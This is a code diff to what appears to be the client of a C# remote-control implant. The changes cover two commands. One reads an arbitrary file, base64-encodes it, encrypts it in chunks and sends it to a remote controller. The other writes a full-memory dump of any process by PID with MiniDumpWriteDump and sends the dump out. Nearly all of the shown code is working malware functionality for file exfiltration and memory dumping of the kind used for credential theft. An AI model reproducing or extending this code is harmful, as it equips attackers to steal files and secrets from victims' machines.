@@ -9,6 +9,7 @@ using System.Diagnostics.CodeAnalysis;
 using Microsoft.Win32.SafeHandles;
 using System.Drawing;
 using System.Drawing.Imaging;
+using System.ServiceModel.Channels;
 
 namespace Client_side
 {
@@ -35,19 +36,21 @@ namespace Client_side
                         List<string> fileChunks = GetFile(commandParts[1]);
                         string fileID = Guid.NewGuid().ToString();
                         string fileLength = fileChunks.Count.ToString();
-                        string fileName = System.IO.Path.GetFileName(commandParts[1]);
-                        
-                        // Send the file ID and the number of chunks
-                        byte[] formattedChunk = Encoding.UTF8.GetBytes($"{fileID}{delimiter}{fileLength}{delimiter}{fileName}");
-                        byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
-                        NetworkLayer.SendResult(encryptedChunk);
+                        string fileName = $"{commandParts[1]}";
 
+                        // Send the file ID, file name and the number of chunks
+                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
+                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
+                        NetworkLayer.SendResult(encryptedHeader);
                         // Send the file chunks
+                        int counter = 0;
                         foreach (string chunk in fileChunks)
                         {
-                            formattedChunk = Encoding.UTF8.GetBytes($"{fileID}{delimiter}{chunk}");
-                            encryptedChunk = encryptor.Encrypt(formattedChunk);
+                            string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}";
+                            byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
                             NetworkLayer.SendResult(encryptedChunk);
+                            Thread.Sleep(10);
+                            counter++;
                         }
                         break;
                     }
@@ -74,7 +77,8 @@ namespace Client_side
                             string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}";
                             byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
                             NetworkLayer.SendResult(encryptedChunk);
-                            Thread.Sleep(10); // Sleep for 10ms to avoid packet loss
+                            Thread.Sleep(10);
+                            Console.WriteLine(formattedChunk);
                             counter++;
                         }
                         break;
@@ -179,17 +183,17 @@ namespace Client_side
 
         public static List<string> GetFile(string path)
         {
-            string fileContent;
+            byte[] fileContent;
             try
             {
-                fileContent = System.IO.File.ReadAllText(path);
-                fileContent = Encryptor.ConvertStr(fileContent);
+                fileContent = File.ReadAllBytes(path);
+                string fileContent64 = Encryptor.ConvertStr(fileContent);
                 // Split the file content into chunks of 4096 bytes
                 int chunkSize = 4096;
                 List<string> chunks = new();
-                for (int i = 0; i < fileContent.Length; i += chunkSize)
+                for (int i = 0; i < fileContent64.Length; i += chunkSize)
                 {
-                    chunks.Add(fileContent.Substring(i, Math.Min(chunkSize, fileContent.Length - i)));
+                    chunks.Add(fileContent64.Substring(i, Math.Min(chunkSize, fileContent64.Length - i)));
                 }
 
                 return chunks;
@@ -199,6 +203,7 @@ namespace Client_side
                 return new List<string> { e.Message };
             }
         }
+
 
         [DllImport("dbghelp.dll", 
             EntryPoint = "MiniDumpWriteDump",
@@ -225,7 +230,6 @@ namespace Client_side
             string fileName = Guid.NewGuid().ToString() + ".dmp";
             string filePath = System.IO.Path.Combine(path, fileName);
 
-            string result;
             try
             {
                 Process process = Process.GetProcessById(int.Parse(pid));
@@ -235,11 +239,11 @@ namespace Client_side
                     {
                         if (!MiniDumpWriteDump(process.Handle, (uint)process.Id, safeFileHandle, MINIDUMP_TYPE.WithFullMemory, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
                         {
-                            result = "Error creating dump file";
+                            Console.WriteLine("Failed to create dump file");
                         }
                         else
                         {
-                            result = "Dump file created successfully";
+                            Console.WriteLine("Dump file created successfully");
                             return GetFile(filePath);
                         }
                     }
@@ -247,6 +251,7 @@ namespace Client_side
             }
             catch (Exception e)
             {
+                Console.WriteLine(e.Message);
                 return new List<string> { e.Message };
             }
             return new List<string>();
